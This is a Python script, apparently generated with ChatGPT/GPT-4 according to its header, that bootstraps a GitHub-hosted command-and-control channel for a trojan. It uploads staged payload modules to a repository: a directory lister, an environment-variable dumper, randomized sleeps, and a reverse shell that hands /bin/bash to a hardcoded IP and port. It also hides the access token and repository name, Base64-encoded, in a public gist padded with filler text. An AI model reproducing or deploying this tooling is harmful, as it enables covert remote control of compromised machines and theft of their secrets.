#!/usr/bin/env python3
'''
Initialization (__init__ method): Upon instantiation of a BootStrapper object, various payloads are defined. These payloads are blocks of code (Python scripts) that can be run on a compromised host to carry out various tasks:

stage_1: A script that returns a JSON configuration with the modules "dir_lister", "enviro", "sleep", and "stage_2_qrw".
stage_2_qrw: A script that returns a JSON configuration with the modules "shell_module" and "sleep24h".
dir_lister: A script that lists the contents of the current directory.
enviro: A script that returns the current environment variables.
sleep: A script that makes the program sleep for a random amount of time between 10 and 15 seconds.
sleep24h: A script that makes the program sleep for a time close to 24 hours.
shell_module: A script that attempts to connect to a specific IP address and port, and opens a reverse shell if successful.
Establishing Connection with GitHub (boot_repo method): This method checks if there is already a repository with 'QTRW' in its name. If it exists, it sets the repository for further use. If not, it creates a new repository with a random name following a specific pattern.

Uploading Modules to GitHub (boot_modules method): This method uploads the pre-defined payloads to the GitHub repository. These payloads are uploaded as Python scripts (.py files) in a directory named "modules".

Gist Creation (gist_writer method): This method creates a GitHub Gist with the GitHub username, token, and repository name encoded in Base64 format as its description. The Gist contains a text file with a random name and a Lorem Ipsum text as its content. The ID of the created Gist is then written to a local text file.

Bootstrap Procedure (bootstrap method): This method puts together the previous three operations (establishing connection with GitHub, uploading modules, and creating a Gist).

Main Function: This function creates a BootStrapper object and runs the bootstrap method.
-ChatGPT/GPT-4 

'''
from base64 import b64decode, b64encode
from github3 import gists, login, GitHub
from random import randint
from datetime import datetime

class BootStrapper:

    def __init__(self) -> None:
        self.stage_1 = '''
import json

def run(**args):
    print('[$] Enter stage 1')
    basic_config =json.dumps([{"module" : "dir_lister"},{"module" : "enviro"},{"module" : "sleep"},{"module" : "stage_2_qrw"}])
    return basic_config
                        '''
        self.stage_2_qrw = '''
import json

def run(**args):
    print('[$] Enter Stage 2')
    basic_config =json.dumps([{"module" : "shell_module"},{"module" : "sleep24h"}])
    return basic_config
                            '''
        self.dir_lister =  '''
import os

def run(**args):
    print('[*] In dir_lister module.')
    files = os.listdir('.')
    return str(files)
                            '''
        self.enviro =  '''
import os

def run(**args):
    print('[*] In enviroment module.')
    return os.environ
                        '''
        self.sleep='''
import time
import random

def run(**args):
    upper = 15
    lower = 10
    sleep_time = random.randint(lower, upper)
    print('[!] Sleep:', sleep_time)
    time.sleep(sleep_time)
    return sleep_time
                    '''
        self.sleep24h ='''
import time
import random

def run(**args):
    print('[!] Sleep for a day')
    time.sleep(random.randint(86000,86800))
                        '''
        self.shell_module = '''
import os
import subprocess
import time
import random
import socket


def run():
    host = '192.168.1.167'
    port = 1337
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            s.connect((host,port))
        except:
            time.sleep(random.randint(10,15))
            continue
        os.dup2(s.fileno(),0) 
        os.dup2(s.fileno(),1) 
        os.dup2(s.fileno(),2)
        subprocess.run(["/bin/bash","-i"])
    
'''
        self.module_list = [('stage_1',self.stage_1), ('dir_lister',self.dir_lister), ('enviro',self.enviro), ('sleep',self.sleep), ('stage_2_qrw',self.stage_2_qrw), ('sleep24h',self.sleep24h), ('shell_module',self.shell_module)]
        self.word_list_ick = ('nick', 'pick', 'wick', 'brick', 'click', 'flick', 'quick', 'slick')
        self.word_list_ock = ('dock', 'lock', 'rock', 'sock', 'tock', 'block', 'clock', 'flock')
        self.filename_out = 'client_notes.txt'   

        self.gist_data = GitHub().gist('164013e01c2f3decf3815fd486d75542')
        self.git_token = str(b64decode(self.gist_data.description), 'utf-8')
        self.git_handle = login(token=self.git_token)
        self.git_user = str(self.git_handle.me())
        
        self.git_repo_name = None
        self.repo = None
        self.configured = False

            
    def boot_repo(self)-> None:

        repo_list = self.git_handle.repositories()
        
        for repo in repo_list:
            if 'QTRW' in str(repo):
                self.git_repo_name = str(repo).replace(f'{self.git_user}/','').strip()
                self.repo = self.git_handle.repository(self.git_user,self.git_repo_name)
                self.configured = True
                break
            
        else:
            self.git_repo_name = f'{self.word_list_ick[(randint(1,8)-1)]}-{self.word_list_ock[(randint(1,8)-1)]}-QTRW'
            self.repo = self.git_handle.create_repository(self.git_repo_name)
            

    def boot_modules(self)-> None:
        if not self.configured:
            for module in self.module_list:
                path = f'modules/{module[0]}.py'
                message = f'{module[0]}_init_{datetime.now().isoformat()}'
                bindata = bytes(r'%s' %module[1], 'utf-8')
                self.repo.create_file(path, message, bindata)
    
    def gist_writer(self)-> None:
        if self.git_user and self.git_token and self.git_repo_name:
            git_dict = {'user':self.git_user,'token':self.git_token,'repo':self.git_repo_name}
            bindata = bytes('%r' %git_dict, 'utf-8')
            contents = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec semper nibh vel eleifend tempor. Aliquam tincidunt, urna auctor pulvinar venenatis, enim urna sagittis lacus, lacinia malesuada tortor felis non massa. Sed pulvinar lacus id leo tincidunt, eget cursus neque porttitor. Fusce sit amet blandit arcu, eget dignissim ipsum. Phasellus nec consectetur justo. Aenean viverra, sem eget tempor semper, tortor ligula facilisis purus, et tristique libero dui ac est. Donec dui mi, rutrum iaculis sodales et, viverra dignissim dolor.'
            file_name = f'{self.word_list_ick[(randint(1,8)-1)]}-{self.word_list_ock[(randint(1,8)-1)]}-QRTXWY.txt'
            contents_dict = {file_name: {'content': contents}}
            description = str(b64encode(bindata), 'utf-8')
            gist = self.git_handle.create_gist(description,contents_dict,public=True)
            with open(f'{self.git_repo_name}-gist_id.txt','w') as f:
                f.write(gist.as_dict()['id'])
            

    def bootstrap(self) -> None:
        self.boot_repo()
        self.boot_modules()
        self.gist_writer()

def main():
    bt = BootStrapper()
    bt.bootstrap()

if __name__ == '__main__':
    main()
